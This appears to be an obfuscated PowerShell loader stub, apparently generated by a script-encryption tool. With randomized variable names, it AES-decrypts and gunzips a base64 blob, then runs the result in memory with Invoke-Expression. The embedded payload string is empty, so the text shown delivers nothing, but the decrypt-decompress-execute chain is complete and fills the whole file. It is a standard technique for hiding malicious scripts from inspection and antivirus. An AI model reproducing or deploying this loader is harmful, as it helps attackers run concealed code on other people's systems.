$rximehg = [System.Convert]::FromBase64String("d2P77bpFAzpmDGVyuiR2PgRPi4AgrQxIhsTOl3aBTjs=")
$wyqmmtemf = New-Object "System.Security.Cryptography.AesManaged"
$vmpcgbh = [System.Convert]::FromBase64String("")
$wyqmmtemf.KeySize = 128
$wyqmmtemf.Key = $rximehg
$wyqmmtemf.Mode = [System.Security.Cryptography.CipherMode]::CBC
$wyqmmtemf.Padding = [System.Security.Cryptography.PaddingMode]::ISO10126
$wyqmmtemf.BlockSize = 128
$wyqmmtemf.IV = $vmpcgbh[0..15]
$obski = New-Object System.IO.MemoryStream(,$wyqmmtemf.CreateDecryptor().TransformFinalBlock($vmpcgbh,16,$vmpcgbh.Length-16))
$xvmqgs = New-Object System.IO.MemoryStream
$sqbfpv = New-Object System.IO.Compression.GzipStream $obski, ([IO.Compression.CompressionMode]::Decompress)
$sqbfpv.CopyTo($xvmqgs)
$jjxs = [System.Text.Encoding]::UTF8.GetString($xvmqgs.ToArray())
$wyqmmtemf.Dispose()
$obski.Close()
$sqbfpv.Close()
Invoke-Expression($jjxs)
